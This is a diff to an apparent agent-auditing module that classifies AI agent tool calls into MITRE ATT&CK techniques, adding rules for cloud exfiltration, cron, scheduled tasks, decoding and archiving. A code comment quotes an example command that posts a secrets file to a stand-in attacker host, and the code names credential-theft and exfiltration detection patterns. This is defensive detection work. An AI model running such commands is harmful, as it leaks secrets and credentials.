@@ -108,6 +108,12 @@ _TOOL_MAP: dict[str, dict[str, str]] = {
 #  in the detection rules, not in per-event tagging.)
 _CREDENTIAL_ACCESS = _m("TA0006", "Credential Access", "T1552.001", "Credentials In Files")
 _PRIVATE_KEY = _m("TA0006", "Credential Access", "T1552.004", "Private Keys")
+# Seen in the command itself (#55). Ordered below credentials and egress.
+_EXFIL_CLOUD = _m("TA0010", "Exfiltration", "T1567.002", "Exfiltration to Cloud Storage")
+_SCHEDULED = _m("TA0003", "Persistence", "T1053.005", "Scheduled Task")
+_CRON = _m("TA0003", "Persistence", "T1053.003", "Cron")
+_DECODE = _m("TA0005", "Defense Evasion", "T1140", "Deobfuscate/Decode Files or Information")
+_ARCHIVE = _m("TA0009", "Collection", "T1560.001", "Archive via Utility")
 
 # Credential and private-key recognition now lives in detection/traits.py, and
 # this module imports it rather than keeping a second copy.
@@ -121,6 +127,11 @@ _PRIVATE_KEY = _m("TA0006", "Credential Access", "T1552.004", "Private Keys")
 # information and no test corpus. A disagreement between them was not merely
 # possible, it was undetectable.
 from agentmetry.core.audit.detection.traits import (  # noqa: E402
+    ARCHIVE_COMMAND,
+    CLOUD_STORAGE_UPLOAD,
+    CRON_INSTALL,
+    DECODE_COMMAND,
+    SCHEDULED_TASK,
     CREDENTIAL_CLI,
     CREDENTIAL_ENV,
     CREDENTIAL_ENV_DUMP,
@@ -129,7 +140,9 @@ from agentmetry.core.audit.detection.traits import (  # noqa: E402
     INTERPRETER_NETWORK,
     PRIVATE_KEY_PATH,
     interpreter_network_text,
+    mask_env_names_only,
     mask_literals,
+    tool_kind,
 )
 
 # Shell-wrapped network egress. `bash: curl -d @secrets https://evil.com` is a
@@ -229,6 +242,15 @@ def get_mitre_mapping(
     """
     text = _evidence_text(evidence)
 
+    # The tool decides which upgrades its evidence can earn, exactly as in
+    # traits.classify_tool_call, so the two classifiers cannot disagree (#40).
+    # A write or a listing earns none: the evidence is a path or file content,
+    # and writing `.env` is not reading it (#329, shapes 4 and 5). A read earns
+    # the credential upgrades from its path, never C2.
+    kind = tool_kind(tool_qualified)
+    if kind in ("write", "list"):
+        text = ""
+
     # 1. Content upgrades win — a read that touches a key is credential access,
     #    not generic collection.
     if text:
@@ -254,14 +276,28 @@ def get_mitre_mapping(
             written = text
         if PRIVATE_KEY_PATH.search(literal):
             return _PRIVATE_KEY
-        if (
+        if kind == "read":
+            if CREDENTIAL_PATH.search(literal) or ENV_FILE.search(literal):
+                return _CREDENTIAL_ACCESS
+            text = ""
+        elif (
             CREDENTIAL_PATH.search(literal)
-            or ENV_FILE.search(literal)
+            or ENV_FILE.search(
+                # The raw shell text, not lowered: awk's `-F` and `-f` differ.
+                mask_env_names_only(literal, shell if shell else None)
+            )
             or CREDENTIAL_ENV.search(text)
             or CREDENTIAL_ENV_DUMP.search(written)
             or CREDENTIAL_CLI.search(written)
         ):
             return _CREDENTIAL_ACCESS
+        # Command words in their original case (tar's `-C` is not `-c`), with
+        # quotes and heredocs masked so a description of the command is not it.
+        words = mask_literals(shell) if shell else written
+        # Exfiltration to a bucket outranks C2: `azcopy` to a blob URL is both,
+        # and the specific technique is the useful one (#55).
+        if kind == "command" and CLOUD_STORAGE_UPLOAD.search(words):
+            return _EXFIL_CLOUD
         # A shell that reaches the network is C2, whatever the tool is called.
         # An interpreter counts: `python -c "urllib.request.urlopen(...)"` is a
         # network client, and in a container it is often the only one installed.
@@ -276,6 +312,16 @@ def get_mitre_mapping(
             )
         ):
             return _C2
+        # Observable techniques that used to collapse into T1059 (#55).
+        if kind == "command":
+            if SCHEDULED_TASK.search(words):
+                return _SCHEDULED
+            if CRON_INSTALL.search(words):
+                return _CRON
+            if DECODE_COMMAND.search(words):
+                return _DECODE
+            if ARCHIVE_COMMAND.search(words):
+                return _ARCHIVE
 
     # 2. Tool-name mapping on the method segment (the part after the last '.'),
     #    normalized so Cursor/Claude/driver spellings all land on one entry.
